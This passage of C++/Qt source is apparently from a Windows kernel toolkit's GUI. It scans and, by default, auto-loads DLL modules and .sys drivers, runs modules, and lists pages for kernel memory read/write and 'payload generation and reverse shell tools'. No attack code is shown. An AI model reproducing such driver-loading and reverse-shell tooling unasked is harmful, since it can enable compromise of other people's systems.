    if (ModuleRunning.load())
        return;
    for (ModuleEntry &Module : DllModules)
        DestroyModuleInstance(Module);
    for (ModuleEntry &Driver : DriverModules)
        Driver.Loaded = QueryDriverLoadedState(Driver);
    DllModules.clear();
    DriverModules.clear();

    for (const QString &ConfiguredPath : ConfigurationPaths("Modules", "./Modules"))
    {
        QDir Directory(ResolveRuntimePath(ConfiguredPath));
        for (const QFileInfo &File : Directory.entryInfoList({"*.dll"}, QDir::Files, QDir::Name))
            DllModules.push_back(ProbeModuleFile(File.absoluteFilePath()));
    }
    for (const QString &ConfiguredPath : ConfigurationPaths("Drivers", "./Drivers"))
    {
        QDir Directory(ResolveRuntimePath(ConfiguredPath));
        for (const QFileInfo &File : Directory.entryInfoList({"*.sys"}, QDir::Files, QDir::Name))
        {
            ModuleEntry Module;
            Module.Name = Utf8Bytes(File.completeBaseName());
            Module.Path = Utf8Bytes(File.absoluteFilePath());
            Module.Category = "System Driver";
            Module.Description = Module.Name;
            Module.Author = "Unknown";
            Module.ServiceName = Utf8Bytes(NormalizedServiceName(File.completeBaseName()));
            Module.Loaded = QueryDriverLoadedState(Module);
            DriverModules.push_back(Module);
        }
    }

    if (ConfigurationValue("Modules", "AutoLoad", true).toBool())
    {
        for (ModuleEntry &Module : DllModules)
        {
            if (Module.Valid)
                LoadModuleInstance(Module);
        }
    }
    if (ConfigurationValue("Drivers", "AutoLoad", true).toBool())
    {
        for (ModuleEntry &Driver : DriverModules)
            SetDriverLoaded(Driver, true);
    }
    ModulesScanned = true;
}

void EnsureRuntimeModulesScanned()
{
    if (!ModulesScanned)
        ScanRuntimeModules();
}

bool SetDriverLoaded(ModuleEntry &Module, bool Loaded, QString *Error)
{
    const std::wstring Service = QString::fromStdString(Module.ServiceName).toStdWString();
    DWORD Result = 1;
    if (Loaded)
    {
        const std::wstring Path = QString::fromStdString(Module.Path).toStdWString();
        Result = LoadDriverService(Path.c_str(), Service.c_str());
    }
    else
    {
        Result = UnloadDriverService(Service.c_str());
    }
    if (Result != 0)
    {
        Module.Loaded = QueryDriverLoadedState(Module);
        if (Error)
            *Error = Loaded ? "Failed to load the driver service." : "Failed to unload the driver service.";
        return false;
    }
    Module.Loaded = QueryDriverLoadedState(Module);
    return true;
}

bool QueryDriverLoadedState(ModuleEntry &Module)
{
    const std::wstring Service = QString::fromStdString(Module.ServiceName).toStdWString();
    if (Service.empty())
        return false;
    return IsDriverServiceRunning(Service.c_str());
}

std::vector<ModuleEntry *> ModulesByCategory(const QString &Category, bool IncludePayload = false)
{
    EnsureRuntimeModulesScanned();
    std::vector<ModuleEntry *> Result;
    for (ModuleEntry &Module : DllModules)
    {
        if (!Module.Valid)
            continue;
        if (!IncludePayload && Module.Category == "Payload")
            continue;
        if (Category == "All" || QString::fromStdString(Module.Category) == Category)
            Result.push_back(&Module);
    }
    return Result;
}

bool StartModuleExecution(ModuleEntry *Entry, PlainTextEdit *Output)
{
    if (!Entry || ModuleRunning.exchange(true))
        return false;
    QString Error;
    if (!LoadModuleInstance(*Entry, &Error))
    {
        ModuleRunning = false;
        AppendModuleOutput("[!] " + Error + "\n");
        return false;
    }
    ModuleBase *Instance = static_cast<ModuleBase *>(Entry->ModuleInstance);
    if (!Instance->ValidateOptions())
    {
        ModuleRunning = false;
        AppendModuleOutput("[!] Required options are missing or invalid.\n");
        return false;
    }
    ModuleOutputWidget = Output;
    RunningModulePath = QString::fromStdString(Entry->Path);
    const QString Name = QString::fromStdString(Entry->Name);
    ClearModuleOutput();
    AppendModuleOutput("[*] Starting: " + Name + "\n");
    std::thread([Entry, Instance, Name] {
        bool Ok = false;
        QString Failure;
        const std::string Captured = Module::CaptureOutputStreaming(
            [&] {
                DWORD SehCode = ERROR_SUCCESS;
                try
                {
                    if (!InvokeModuleWithSeh(Instance, &Ok, &SehCode))
                        Failure = QString("[!] Module raised SEH exception 0x%1.\n")
                                      .arg(static_cast<qulonglong>(SehCode), 8, 16, QLatin1Char('0'))
                                      .toUpper();
                }
                catch (...)
                {
                    Failure = "[!] Module raised a C++ exception.\n";
                }
            },
            [](const std::string &Chunk) { AppendModuleOutput(Utf8Text(Chunk)); });
        if (!Failure.isEmpty())
            AppendModuleOutput(Failure);
        if (Captured.empty() && !Ok && Failure.isEmpty())
            AppendModuleOutput("[!] Module returned failure without output.\n");
        AppendModuleOutput(QString("[*] Finished: %1\n").arg(Ok ? "OK" : "FAILED"));
        RunningModulePath.clear();
        ModuleRunning = false;
    }).detach();
    return true;
}

struct PageDefinition
{
    const char *Title;
    const char *Subtitle;
    Fluent::IconType Icon;
};

constexpr std::array<PageDefinition, 17> KPages{{
    {"Information", "Application overview, environment status, and system information.", Fluent::IconType::INFO},
    {"Task", "Monitor system tasks in real-time.", Fluent::IconType::PEOPLE},
    {"Monitor", "System and process activity monitoring.", Fluent::IconType::VIEW},
    {"Registry", "Registry protection and management.", Fluent::IconType::CODE},
    {"File", "File protection and management.", Fluent::IconType::DOCUMENT},
    {"Window", "Window enumeration and management.", Fluent::IconType::BACK_TO_WINDOW},
    {"Driver", "Kernel driver enumeration and service control.", Fluent::IconType::DEVELOPER_TOOLS},
    {"Memory", "Read and write process memory through the kernel driver.", Fluent::IconType::TILES},
    {"Table", "Inspect kernel system table addresses and timing data.", Fluent::IconType::LAYOUT},
    {"Callback", "View and manage callback function registrations.", Fluent::IconType::SYNC},
    {"Payload", "Payload generation and reverse shell tools.", Fluent::IconType::SEND},
    {"ModuleRun", "Configure and execute runtime modules.", Fluent::IconType::PLAY},
    {"ModuleManager", "Manage installed modules and dependencies.", Fluent::IconType::LIBRARY},
    {"Console", "Integrated command-line console for debugging.", Fluent::IconType::COMMAND_PROMPT},
    {"Settings", "Application settings and configuration options.", Fluent::IconType::SETTING},
    {"KernelInspector", "Inspect kernel memory, objects, filters, networking, and security state.", Fluent::IconType::SEARCH},
    {"ServiceManager", "Windows services and kernel driver management.", Fluent::IconType::DEVELOPER_TOOLS},
}};

QIcon CreateFluentIcon(Fluent::IconType Icon)
{
    return Fluent::icon(Icon);
}

void ShowLaunchAsDialog(QWidget *Parent);

FluentLabelBase *MakeLabel(const QString &Text, int PixelSize, const QColor &Color,
                           QFont::Weight Weight)
{
    auto *Label = new FluentLabelBase(Text, PixelSize, Weight);
    QColor EffectiveColor = Color;
    if (Color == KTextPrimary)
    {
        Label->setProperty("TextRole", "Primary");
        EffectiveColor = PrimaryTextColor();
    }
    else if (Color == KTextMuted)
    {
        Label->setProperty("TextRole", "Muted");
        EffectiveColor = MutedTextColor();
    }
    else if (Color == KAccent)
    {
        Label->setProperty("TextRole", "Accent");
        EffectiveColor = ConfiguredColor("AccentColor", KAccent);
    }
    Label->setProperty("ThemeBasePixelSize", PixelSize);
    Label->setTextColor(EffectiveColor, EffectiveColor);
    return Label;
}

IconWidget *MakeGlyph(Fluent::IconType Glyph, int IconSize)
{
    auto *Icon = new IconWidget(Fluent::coloredIcon(Glyph, KAccent, KAccent));
    Icon->setFixedSize(IconSize, IconSize);
    return Icon;
}

QString ApplicationIconPath()
{
    return QCoreApplication::applicationDirPath() + "/Data/ICON.png";
}

QImage ApplicationIconImage()
{
    const QString Path = ApplicationIconPath();
    if (!QFileInfo::exists(Path))
        return {};

    QImage Image(Path);
    if (Image.isNull())
        return {};
    return Image.convertToFormat(QImage::Format_ARGB32_Premultiplied);
}

int ColorDistanceSquared(QRgb Left, QRgb Right)
{
    const int DeltaRed = qRed(Left) - qRed(Right);
    const int DeltaGreen = qGreen(Left) - qGreen(Right);
    const int DeltaBlue = qBlue(Left) - qBlue(Right);
    return DeltaRed * DeltaRed + DeltaGreen * DeltaGreen + DeltaBlue * DeltaBlue;
}

QRect ApplicationIconVisibleBounds(const QImage &Image)
{
    if (Image.isNull())
        return {};

    const QRgb BackgroundSamples[] = {
        Image.pixel(0, 0),
        Image.pixel(std::max(0, Image.width() - 1), 0),
        Image.pixel(0, std::max(0, Image.height() - 1)),
        Image.pixel(std::max(0, Image.width() - 1), std::max(0, Image.height() - 1)),
    };

    int SumAlpha = 0;
    int SumRed = 0;
    int SumGreen = 0;
    int SumBlue = 0;
    for (QRgb Sample : BackgroundSamples)
    {
        SumAlpha += qAlpha(Sample);
        SumRed += qRed(Sample);
        SumGreen += qGreen(Sample);
        SumBlue += qBlue(Sample);
    }

    const QRgb Background = qRgba(SumRed / 4, SumGreen / 4, SumBlue / 4, SumAlpha / 4);
    constexpr int HardAlphaThreshold = 72;
    constexpr int SoftAlphaThreshold = 12;
    constexpr int BackgroundToleranceSquared = 18 * 18 * 3;

    const auto IsVisiblePixel = [Background](QRgb Pixel) {
        const int Alpha = qAlpha(Pixel);
        if (Alpha <= SoftAlphaThreshold)
            return false;
        if (Alpha >= HardAlphaThreshold)
            return true;
        return ColorDistanceSquared(Pixel, Background) > BackgroundToleranceSquared;
    };

    int Left = Image.width();
    int Top = Image.height();
    int Right = -1;
    int Bottom = -1;
    for (int Y = 0; Y < Image.height(); ++Y)
    {
        const QRgb *Line = reinterpret_cast<const QRgb *>(Image.constScanLine(Y));
        for (int X = 0; X < Image.width(); ++X)
        {
            if (!IsVisiblePixel(Line[X]))
                continue;
            Left = std::min(Left, X);
            Top = std::min(Top, Y);
            Right = std::max(Right, X);
            Bottom = std::max(Bottom, Y);
        }
    }
    if (Right < Left || Bottom < Top)
        return QRect(0, 0, Image.width(), Image.height());
    return QRect(QPoint(Left, Top), QPoint(Right, Bottom));
}

QRect ApplicationIconFocusBounds(const QImage &Image, const QRect &VisibleBounds)
{
    if (Image.isNull() || !VisibleBounds.isValid())
        return {};

    const int VisibleWidth = VisibleBounds.width();
    const int VisibleHeight = VisibleBounds.height();
    int Side = std::min(VisibleWidth, VisibleHeight);
    if (Side <= 0)
        return VisibleBounds;

    if (VisibleHeight > VisibleWidth * 1.08)
        Side = std::max(1, qRound(Side * 0.86));
    else if (VisibleWidth > VisibleHeight * 1.08)
        Side = std::max(1, qRound(Side * 0.9));

    const QPoint Center = VisibleBounds.center();
    int Left = Center.x() - Side / 2;
    int Top = Center.y() - Side / 2;

    Left = qBound(0, Left, std::max(0, Image.width() - Side));
    Top = qBound(0, Top, std::max(0, Image.height() - Side));
    return QRect(Left, Top, Side, Side);
}

QPixmap ApplicationIconPixmap(const QSize &TargetSize)
{
    const QImage Source = ApplicationIconImage();
    if (Source.isNull() || TargetSize.width() <= 0 || TargetSize.height() <= 0)
        return {};

    const QRect Bounds = ApplicationIconVisibleBounds(Source);
    const QRect FocusBounds = ApplicationIconFocusBounds(Source, Bounds);
    QImage Cropped = Source.copy(FocusBounds.isValid() ? FocusBounds : Bounds);
    if (Cropped.isNull())
        return {};

    const QImage Scaled = Cropped.scaled(TargetSize, Qt::KeepAspectRatioByExpanding, Qt::SmoothTransformation);
    if (Scaled.isNull())
        return {};

    const int Left = std::max(0, (Scaled.width() - TargetSize.width()) / 2);
    const int Top = std::max(0, (Scaled.height() - TargetSize.height()) / 2);
    return QPixmap::fromImage(Scaled.copy(Left, Top, TargetSize.width(), TargetSize.height()));
}

QPixmap ApplicationIconFitPixmap(const QSize &TargetSize)
{
    const QImage Source = ApplicationIconImage();
    if (Source.isNull() || TargetSize.width() <= 0 || TargetSize.height() <= 0)
        return {};

    const QRect Bounds = ApplicationIconVisibleBounds(Source);
    QImage Cropped = Source.copy(Bounds.isValid() ? Bounds : QRect(0, 0, Source.width(), Source.height()));
    if (Cropped.isNull())
        return {};

    const QImage Scaled = Cropped.scaled(TargetSize, Qt::KeepAspectRatio, Qt::SmoothTransformation);
    if (Scaled.isNull())
        return {};

    QImage Canvas(TargetSize, QImage::Format_ARGB32_Premultiplied);
    Canvas.fill(Qt::transparent);

    QPainter Painter(&Canvas);
    const int Left = std::max(0, (TargetSize.width() - Scaled.width()) / 2);
    const int Top = std::max(0, (TargetSize.height() - Scaled.height()) / 2);
    Painter.drawImage(QPoint(Left, Top), Scaled);
    Painter.end();

    return QPixmap::fromImage(Canvas);
}

QPixmap ApplicationIconPixmap(int Size)
{
    return ApplicationIconPixmap(QSize(Size, Size));
}

QIcon ApplicationIcon()
{
    QIcon Icon;
    for (const int Size : {16, 20, 24, 32, 40, 48, 64, 128, 256})
    {
        const QPixmap Pixmap = ApplicationIconPixmap(Size);
        if (!Pixmap.isNull())
            Icon.addPixmap(Pixmap);
    }
    return Icon;
}

QWidget *MakeApplicationIconWidget(const QSize &IconSize)
{
    const QPixmap Pixmap = ApplicationIconPixmap(IconSize);
    if (Pixmap.isNull())
        return MakeGlyph(Fluent::IconType::APPLICATION, std::max(IconSize.width(), IconSize.height()));

    auto *Label = new QLabel;
    Label->setFixedSize(IconSize);
    Label->setAlignment(Qt::AlignCenter);
    Label->setScaledContents(true);
    Label->setPixmap(Pixmap);
    return Label;
}

QWidget *MakeApplicationIconWidget(int IconSize)
{
    return MakeApplicationIconWidget(QSize(IconSize, IconSize));
}

QWidget *MakeApplicationIconFitWidget(const QSize &IconSize)
{
    const QPixmap Pixmap = ApplicationIconFitPixmap(IconSize);
    if (Pixmap.isNull())
        return MakeGlyph(Fluent::IconType::APPLICATION, std::max(IconSize.width(), IconSize.height()));

    auto *Label = new QLabel;
    Label->setFixedSize(IconSize);
    Label->setAlignment(Qt::AlignCenter);
    Label->setPixmap(Pixmap);
    return Label;
}

void InstallFluentScrollBar(QAbstractScrollArea *Area, Qt::Orientation Orientation)
{
    QScrollBar *OriginalScrollBar =
        Orientation == Qt::Vertical ? Area->verticalScrollBar() : Area->horizontalScrollBar();
    auto *OverlayScrollBar = new ScrollBar(OriginalScrollBar, Area);
    OverlayScrollBar->setAnimationEnabled(true);
}

class InformationItem final : public SimpleCardWidget
{
  public:
    InformationItem(Fluent::IconType Glyph, const QString &Title, const QString &Description, const QString &Value,
                    QWidget *Parent = nullptr)
        : SimpleCardWidget(Parent)
    {
        setBorderRadius(8);
        setMinimumHeight(88);
        setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Minimum);

        auto *Layout = new QHBoxLayout(this);
        Layout->setContentsMargins(16, 14, 16, 14);
        Layout->setSpacing(14);

        auto *IconHost = new QWidget;
        IconHost->setFixedSize(44, 44);
        const bool DarkMode = ConfigurationValue("Theme", "DarkMode", KDefaultThemeDarkMode).toBool();
        QColor IconBackground = ConfiguredColor("AccentColor", KAccent);
        IconBackground.setAlpha(DarkMode ? 52 : 28);
        IconHost->setStyleSheet(QString("background: rgba(%1,%2,%3,%4); border-radius: 22px;")
                                    .arg(IconBackground.red())
                                    .arg(IconBackground.green())
                                    .arg(IconBackground.blue())
                                    .arg(IconBackground.alpha()));
        auto *IconHostLayout = new QVBoxLayout(IconHost);
        IconHostLayout->setContentsMargins(0, 0, 0, 0);
        IconHostLayout->addWidget(MakeGlyph(Glyph, 22), 0, Qt::AlignCenter);
        Layout->addWidget(IconHost, 0, Qt::AlignTop);

        auto *TextLayout = new QVBoxLayout;
        TextLayout->setContentsMargins(0, 0, 0, 0);
        TextLayout->setSpacing(4);
        auto *TitleLabel = MakeLabel(Title, 14, KTextPrimary, QFont::DemiBold);
        auto *DescriptionLabel = MakeLabel(Description, 12, KTextMuted);
        DescriptionLabel->setWordWrap(true);
        TextLayout->addWidget(TitleLabel);
        TextLayout->addWidget(DescriptionLabel);
        Layout->addLayout(TextLayout, 1);

        auto *ValueLabel = MakeLabel(Value, 14, KTextPrimary, QFont::Medium);
        ValueLabel->setAlignment(Qt::AlignRight | Qt::AlignTop);
        ValueLabel->setWordWrap(true);
        ValueLabel->setMinimumWidth(150);
        ValueLabel->setMaximumWidth(360);
        Layout->addWidget(ValueLabel);
    }
};

class InformationSectionHeader final : public QWidget
{
  public:
    InformationSectionHeader(const QString &Title, const QString &Description, QWidget *Parent = nullptr)
        : QWidget(Parent)
    {
        auto *Layout = new QVBoxLayout(this);
        Layout->setContentsMargins(2, 8, 2, 2);
        Layout->setSpacing(6);

        Layout->addWidget(MakeLabel(Title, 17, KTextPrimary, QFont::DemiBold));
        if (!Description.trimmed().isEmpty())
        {
            auto *DescriptionLabel = MakeLabel(Description, 12, KTextMuted);
            DescriptionLabel->setWordWrap(true);
            Layout->addWidget(DescriptionLabel);
        }

        auto *Divider = new QFrame;
        Divider->setFixedHeight(1);
        const bool DarkMode = ConfigurationValue("Theme", "DarkMode", KDefaultThemeDarkMode).toBool();
        const QColor DividerColor = DarkMode ? QColor(255, 255, 255, 24) : QColor(0, 0, 0, 18);
        Divider->setStyleSheet(QString("background: rgba(%1,%2,%3,%4); border: none;")
                                   .arg(DividerColor.red())
                                   .arg(DividerColor.green())
                                   .arg(DividerColor.blue())
                                   .arg(DividerColor.alpha()));
        Layout->addWidget(Divider);
    }
};

class InformationBadge final : public SimpleCardWidget
{
  public:
    InformationBadge(const QString &Caption, const QString &Value, QWidget *Parent = nullptr) : SimpleCardWidget(Parent)
    {
        setBorderRadius(8);
        setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);

        auto *Layout = new QVBoxLayout(this);
        Layout->setContentsMargins(14, 12, 14, 12);
        Layout->setSpacing(4);

        auto *CaptionLabel = MakeLabel(Caption, 11, KTextMuted, QFont::Medium);
        auto *ValueLabel = MakeLabel(Value, 14, KTextPrimary, QFont::DemiBold);
        ValueLabel->setWordWrap(true);
        Layout->addWidget(CaptionLabel);
        Layout->addWidget(ValueLabel);
    }
};

class InformationNoticeCard final : public SimpleCardWidget
{
  public:
    InformationNoticeCard(Fluent::IconType Glyph, const QString &Title, const QString &Content, const QColor &Color,
                          QWidget *Parent = nullptr)
        : SimpleCardWidget(Parent)
    {
        setBorderRadius(8);
        setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);

        auto *Layout = new QHBoxLayout(this);
        Layout->setContentsMargins(16, 14, 16, 14);
        Layout->setSpacing(12);

        auto *IconHost = new QWidget;
        IconHost->setFixedSize(40, 40);
        QColor Background = Color;
        Background.setAlpha(ConfigurationValue("Theme", "DarkMode", KDefaultThemeDarkMode).toBool() ? 54 : 24);
        IconHost->setStyleSheet(QString("background: rgba(%1,%2,%3,%4); border-radius: 20px;")
                                    .arg(Background.red())
                                    .arg(Background.green())
                                    .arg(Background.blue())
                                    .arg(Background.alpha()));
        auto *IconHostLayout = new QVBoxLayout(IconHost);
        IconHostLayout->setContentsMargins(0, 0, 0, 0);
        IconHostLayout->addWidget(new IconWidget(Fluent::coloredIcon(Glyph, Color, Color)), 0, Qt::AlignCenter);
        Layout->addWidget(IconHost, 0, Qt::AlignTop);

        auto *TextLayout = new QVBoxLayout;
        TextLayout->setContentsMargins(0, 0, 0, 0);
        TextLayout->setSpacing(3);
        TextLayout->addWidget(MakeLabel(Title, 13, Color, QFont::DemiBold));
        auto *ContentLabel = MakeLabel(Content, 12, KTextMuted);
        ContentLabel->setWordWrap(true);
        TextLayout->addWidget(ContentLabel);
        Layout->addLayout(TextLayout, 1);
    }
};

QString QueryTestSigning()
{
    using NtQuerySystemInformationFn = LONG(WINAPI *)(ULONG, PVOID, ULONG, PULONG);
    struct CodeIntegrityInformation
    {
        ULONG Length;
        ULONG Options;
    };
    CodeIntegrityInformation Information{sizeof(Information), 0};
    const HMODULE Ntdll = GetModuleHandleW(L"Ntdll.dll");
    if (!Ntdll)
        return "Unknown";
    const auto Query = reinterpret_cast<NtQuerySystemInformationFn>(GetProcAddress(Ntdll, "NtQuerySystemInformation"));
    if (!Query || Query(103, &Information, sizeof(Information), nullptr) != 0)
        return "Unknown";
    return (Information.Options & 0x2u) ? "Enabled" : "Disabled";
}

QString QueryNpcap()
{
    SC_HANDLE Manager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!Manager)
        return "Unknown";
    SC_HANDLE Service = OpenServiceW(Manager, L"npcap", SERVICE_QUERY_STATUS);
    if (!Service)
    {
        CloseServiceHandle(Manager);
        return "Not installed";
    }
    SERVICE_STATUS_PROCESS Status{};
    DWORD BytesNeeded = 0;
    const bool Ok = QueryServiceStatusEx(Service, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&Status),
                                         sizeof(Status), &BytesNeeded) != FALSE;
    CloseServiceHandle(Service);
    CloseServiceHandle(Manager);
    if (!Ok)
        return "Unknown";
    if (Status.dwCurrentState == SERVICE_RUNNING)
        return "Running";
    if (Status.dwCurrentState == SERVICE_STOPPED)
        return "Stopped";
    return "Installed";
}

QString CertificateState()
{
    const QString Path = QCoreApplication::applicationDirPath() + "/Data/CA_CERT.pem";
    return QFileInfo::exists(Path) ? "Certificate available" : "CA_CERT.pem not found";
}

QString FormatBytes(quint64 Bytes)
{
    static const char *Units[] = {"B", "KB", "MB", "GB", "TB"};
    double Value = static_cast<double>(Bytes);
    int Index = 0;
    while (Value >= 1024.0 && Index < 4)
    {
        Value /= 1024.0;
        ++Index;
    }
    return QString::number(Value, Index == 0 ? 'f' : 'f', Index < 2 ? 0 : 1) + " " + Units[Index];
}

QString FormatRate(quint64 BytesPerSecond)
{
    return FormatBytes(BytesPerSecond) + "/s";
}

QString RegistryStringValue(HKEY RootKey, const wchar_t *SubKey, const wchar_t *ValueName)
{
    HKEY Key = nullptr;
    if (RegOpenKeyExW(RootKey, SubKey, 0, KEY_READ, &Key) != ERROR_SUCCESS)
        return {};

    DWORD Type = 0;
    DWORD Size = 0;
    const LONG QueryStatus = RegQueryValueExW(Key, ValueName, nullptr, &Type, nullptr, &Size);
    if (QueryStatus != ERROR_SUCCESS || (Type != REG_SZ && Type != REG_EXPAND_SZ && Type != REG_MULTI_SZ) || Size == 0)
    {
        RegCloseKey(Key);
        return {};
    }

    std::wstring Buffer(static_cast<size_t>(Size / sizeof(wchar_t)) + 1, L'\0');
    if (RegQueryValueExW(Key, ValueName, nullptr, &Type, reinterpret_cast<LPBYTE>(Buffer.data()), &Size) !=
        ERROR_SUCCESS)
    {
        RegCloseKey(Key);
        return {};
    }
    RegCloseKey(Key);
    while (!Buffer.empty() && Buffer.back() == L'\0')
        Buffer.pop_back();
    return QString::fromWCharArray(Buffer.c_str()).trimmed();
}

DWORD RegistryDwordValue(HKEY RootKey, const wchar_t *SubKey, const wchar_t *ValueName, DWORD Fallback = 0)
{
    HKEY Key = nullptr;
    if (RegOpenKeyExW(RootKey, SubKey, 0, KEY_READ, &Key) != ERROR_SUCCESS)
        return Fallback;
    DWORD Type = 0;
    DWORD Value = Fallback;
    DWORD Size = sizeof(Value);
    if (RegQueryValueExW(Key, ValueName, nullptr, &Type, reinterpret_cast<LPBYTE>(&Value), &Size) != ERROR_SUCCESS ||
        Type != REG_DWORD)
    {
        RegCloseKey(Key);
        return Fallback;
    }
    RegCloseKey(Key);
    return Value;
}

QString QueryWindowsVersionText()
{
    const QString ProductName =
        RegistryStringValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductName");
    const QString DisplayVersion =
        RegistryStringValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"DisplayVersion");
    const QString CurrentBuild =
        RegistryStringValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"CurrentBuild");
    const DWORD Ubr =
        RegistryDwordValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"UBR", 0);

    QString Version = ProductName.isEmpty() ? QSysInfo::prettyProductName() : ProductName;
    if (!DisplayVersion.isEmpty())
        Version += " " + DisplayVersion;
    if (!CurrentBuild.isEmpty())
        Version += QString(" (build %1.%2)").arg(CurrentBuild).arg(Ubr);
    return Version;
}

QString QueryCpuName()
{
    return RegistryStringValue(HKEY_LOCAL_MACHINE,
                               L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                               L"ProcessorNameString");
}

QString QuerySystemManufacturer()
{
    return RegistryStringValue(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"SystemManufacturer");
}

QString QuerySystemModel()
{
    return RegistryStringValue(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"SystemProductName");
}

QString QueryBoardName()
{
    const QString Manufacturer =
        RegistryStringValue(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"BaseBoardManufacturer");
    const QString Product =
        RegistryStringValue(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"BaseBoardProduct");
    return (Manufacturer + " " + Product).trimmed();
}

QString QueryBiosName()
{
    const QString Vendor =
        RegistryStringValue(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"BIOSVendor");
    const QString Version =
        RegistryStringValue(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"BIOSVersion");
    return (Vendor + " " + Version).trimmed();
}

QString QueryGraphicsAdapters()
{
    QStringList Adapters;
    DISPLAY_DEVICEW Device{};
    Device.cb = sizeof(Device);
    for (DWORD Index = 0; EnumDisplayDevicesW(nullptr, Index, &Device, 0) != FALSE; ++Index)
    {
        if ((Device.StateFlags & DISPLAY_DEVICE_ACTIVE) == 0 || (Device.StateFlags & DISPLAY_DEVICE_MIRRORING_DRIVER) != 0)
        {
            Device = DISPLAY_DEVICEW{};
            Device.cb = sizeof(Device);
            continue;
        }
        const QString Name = QString::fromWCharArray(Device.DeviceString).trimmed();
        if (!Name.isEmpty() && !Adapters.contains(Name))
            Adapters.append(Name);
        Device = DISPLAY_DEVICEW{};
        Device.cb = sizeof(Device);
    }
    return Adapters.isEmpty() ? "Unknown" : Adapters.join(" | ");
}

QString QueryMemoryInstalled()
{
    MEMORYSTATUSEX Memory{};
    Memory.dwLength = sizeof(Memory);
    if (!GlobalMemoryStatusEx(&Memory))
        return "Unknown";
    return FormatBytes(static_cast<quint64>(Memory.ullTotalPhys));
}

QString QuerySystemDriveSummary()
{
    const QStorageInfo Storage(QCoreApplication::applicationDirPath());
    if (!Storage.isValid() || !Storage.isReady())
        return "Unknown";
    const quint64 Total = static_cast<quint64>(Storage.bytesTotal());
    const quint64 Free = static_cast<quint64>(Storage.bytesAvailable());
    const quint64 Used = Total > Free ? Total - Free : 0;
    return QString("%1  |  %2 used").arg(QDir::toNativeSeparators(Storage.rootPath()), FormatBytes(Used));
}

QString FormatDuration(quint64 Milliseconds)
{
    quint64 Seconds = Milliseconds / 1000;
    const quint64 Days = Seconds / 86400;
    Seconds %= 86400;
    const quint64 Hours = Seconds / 3600;
    Seconds %= 3600;
    const quint64 Minutes = Seconds / 60;
    Seconds %= 60;

    QStringList Parts;
    if (Days > 0)
        Parts.append(QString::number(Days) + "d");
    if (Hours > 0 || !Parts.isEmpty())
        Parts.append(QString::number(Hours) + "h");
    if (Minutes > 0 || !Parts.isEmpty())
        Parts.append(QString::number(Minutes) + "m");
    Parts.append(QString::number(Seconds) + "s");
    return Parts.join(' ');
}

struct NetworkTrafficSnapshot
{
    quint64 InBytes = 0;
    quint64 OutBytes = 0;
};

NetworkTrafficSnapshot QueryNetworkTrafficSnapshot()
{
    NetworkTrafficSnapshot Snapshot;
    PMIB_IF_TABLE2 Table = nullptr;
    if (GetIfTable2(&Table) != NO_ERROR || !Table)
        return Snapshot;

    for (ULONG Index = 0; Index < Table->NumEntries; ++Index)
    {
        const MIB_IF_ROW2 &Row = Table->Table[Index];
        if (Row.InterfaceAndOperStatusFlags.FilterInterface || Row.Type == IF_TYPE_SOFTWARE_LOOPBACK ||
            Row.MediaConnectState != MediaConnectStateConnected)
            continue;
        Snapshot.InBytes += Row.InOctets;
        Snapshot.OutBytes += Row.OutOctets;
    }
    FreeMibTable(Table);
    return Snapshot;
}

class CircularGaugeWidget final : public QWidget
{
  public:
    explicit CircularGaugeWidget(QWidget *Parent = nullptr) : QWidget(Parent)
    {
        setFixedSize(118, 118);
    }

    void SetValue(int Value, const QString &Text)
    {
        Percent = std::clamp(Value, 0, 100);
        CenterText = Text;
        update();
    }

  protected:
    void paintEvent(QPaintEvent *Event) override
    {
        Q_UNUSED(Event);
        QPainter Painter(this);
        Painter.setRenderHint(QPainter::Antialiasing, true);

        const QRectF RingRect(12.0, 12.0, width() - 24.0, height() - 24.0);
        const bool DarkMode = ConfigurationValue("Theme", "DarkMode", KDefaultThemeDarkMode).toBool();
        QPen TrackPen(QColor(160, 160, 160, DarkMode ? 48 : 36), 10.0, Qt::SolidLine, Qt::RoundCap);
        Painter.setPen(TrackPen);
        Painter.drawArc(RingRect, 225 * 16, -270 * 16);

        QColor Accent = ConfiguredColor("AccentColor", KAccent);
        if (Percent >= 85)
            Accent = QColor("#D13438");
        else if (Percent >= 65)
            Accent = QColor("#F0A10A");

        QPen ValuePen(Accent, 10.0, Qt::SolidLine, Qt::RoundCap);
        Painter.setPen(ValuePen);
        Painter.drawArc(RingRect, 225 * 16, -qRound(270.0 * Percent / 100.0) * 16);

        Painter.setPen(PrimaryTextColor());
        QFont PercentFont = font();
        PercentFont.setPixelSize(24);
        PercentFont.setWeight(QFont::DemiBold);
        Painter.setFont(PercentFont);
        Painter.drawText(rect().adjusted(0, 8, 0, -8), Qt::AlignCenter, QString::number(Percent) + "%");

        Painter.setPen(MutedTextColor());
        QFont CaptionFont = font();
        CaptionFont.setPixelSize(10);
        Painter.setFont(CaptionFont);
        Painter.drawText(rect().adjusted(12, 68, -12, -8), Qt::AlignHCenter | Qt::TextWordWrap, CenterText);
    }

  private:
    int Percent = 0;
    QString CenterText;
};

class PerformanceDashboardCard final : public SimpleCardWidget
{
  public:
    PerformanceDashboardCard(Fluent::IconType Glyph, const QString &Title, const QString &Description,
                             QWidget *Parent = nullptr)
        : SimpleCardWidget(Parent)
    {
        setBorderRadius(8);
